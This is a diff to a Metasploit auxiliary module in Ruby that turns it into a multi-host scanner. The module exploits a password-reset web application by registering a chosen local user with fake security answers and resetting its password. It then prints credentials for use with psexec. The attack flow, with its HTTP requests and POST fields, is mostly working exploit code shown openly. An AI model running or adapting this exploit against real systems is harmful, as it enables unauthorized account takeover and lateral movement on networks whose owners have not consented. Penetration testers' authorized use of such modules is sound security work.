@@ -9,6 +9,7 @@ class Metasploit4 < Msf::Auxiliary
 
   include Msf::Auxiliary::Report
   include Msf::Exploit::Remote::HttpClient
+  include Msf::Auxiliary::Scanner
 
   def initialize(info = {})
     super(update_info(info,
@@ -38,26 +39,31 @@ class Metasploit4 < Msf::Auxiliary
       ], self.class)
   end
 
-  def run
-    res = send_request_cgi({
+  def localuser
+    datastore['LOCALUSER']
+  end
+
+  def run_host(ip)
+    res = send_request_cgi(
       'uri' => normalize_uri(target_uri.path, 'PasswordReset'),
-    })
+    )
 
     unless res
-      fail_with(Failure::Unknown, "Could not contact server")
+      print_error("#{peer}: Could not contact server")
+      return
     end
 
     cookies = res.get_cookies
     domain = $1 if res.body =~ /"domainName":"(.*)"\}\);/
     domain = datastore['DOMAIN'] if datastore['DOMAIN'] != ''
 
-    res = send_request_cgi({
+    res = send_request_cgi(
       'uri' => normalize_uri(target_uri.path, 'PasswordReset', 'Application', 'Register'),
       'method' => 'POST',
       'cookie' => cookies,
       'vars_post' => {
         'domainname' => domain,
-        'userName' => datastore['LOCALUSER'],
+        'userName' => localuser,
         'emailaddress' => Rex::Text.rand_text_alpha(8) + '@' + Rex::Text.rand_text_alpha(8) + '.com',
         'userQuestions' => '[{"Id":1,"Answer":"not"},{"Id":2,"Answer":"not"}]',
         'updatequesChk' => 'false',
@@ -68,10 +74,11 @@ class Metasploit4 < Msf::Auxiliary
         'confirmanswer' => 'not',
         'confirmanswer' => 'not'
       }
-    })
+    )
 
-    if !res or res.body != "{\"success\":true,\"data\":{\"userUpdated\":true}}"
-      fail_with(Failure::Unknown, "Could not register the user.")
+    if !res || res.body != "{\"success\":true,\"data\":{\"userUpdated\":true}}"
+      print_error("#{peer}: Could not register the #{localuser} user")
+      return
     end
 
     password = Rex::Text.rand_text_alpha(10) + "!1"
@@ -83,16 +90,16 @@ class Metasploit4 < Msf::Auxiliary
       'vars_post' => {
         'newPassword' => password,
         'domain' => domain,
-        'UserName' => datastore['LOCALUSER'],
+        'UserName' => localuser,
         'CkbResetpassword' => 'true'
       }
     })
 
-    if !res or res.body != '{"success":true,"data":{"PasswordResetStatus":0}}'
-      fail_with(Failure::Unknown, "Could not change the user's password. Is it a domain or local user?")
+    if !res || res.body != '{"success":true,"data":{"PasswordResetStatus":0}}'
+      print_error("#{peer}: Could not change #{localuser}'s password -- is it a domain or local user?")
+      return
     end
 
-    print_status("Please run the psexec module using:")
-    print_status("#{domain}\\#{datastore['LOCALUSER']}:#{password}")
+    print_good("#{peer} Please run the psexec module using #{domain}\\#{localuser}:#{password}")
   end
 end
